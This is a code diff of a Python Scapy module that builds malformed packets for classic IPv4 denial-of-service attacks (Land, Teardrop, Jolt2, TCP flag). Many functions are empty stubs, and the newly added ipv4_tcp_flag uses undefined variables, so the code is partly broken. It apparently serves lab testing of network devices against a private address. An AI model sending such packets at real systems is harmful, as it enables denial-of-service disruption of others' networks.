@@ -12,13 +12,15 @@ Desc:
 """
 
 from scapy.all import *
+import random
 
 
-def ping_of_death():
+def ipv4_ping_of_death():
     pass
 
 
-def land_base(smac, target):
+# 构造ipv4 Land-Base攻击异常包，需源目的地址相同，且TCP配置SYN标识位。
+def ipv4_land_base(smac, target):
     data_link_layer = Ether(
         src = smac
     )
@@ -35,7 +37,7 @@ def land_base(smac, target):
     return pkt
 
 
-def tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
+def ipv4_tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     network_layer = IP(
         id = 28752,
         flags = flags,
@@ -49,27 +51,35 @@ def tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     return pkt
 
 
-def tcp_flag():
+def ipv4_tcp_flag():
+    network_layer = IP(
+        src = src,
+        dst = dst
+    )
+    transport_layer = TCP(
+        flag = flag
+    )
+    pkt = network_layer / transport_layer
+    return pkt
+
+
+def ipv4_winnuke():
     pass
 
 
-def winnuke():
+def ipv4_smurf():
     pass
 
 
-def smurf():
+def ipv4_ip_option():
     pass
 
 
-def ip_option():
+def ipv4_ip_spoof():
     pass
 
 
-def ip_spoof():
-    pass
-
-
-def jolt2(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
+def ipv4_jolt2(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     network_layer = IP(
         id=28752,
         flags=flags,
@@ -83,5 +93,5 @@ def jolt2(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     return pkt
 
 
-def tcp_sack():
+def ipv4_tcp_sack():
     pass
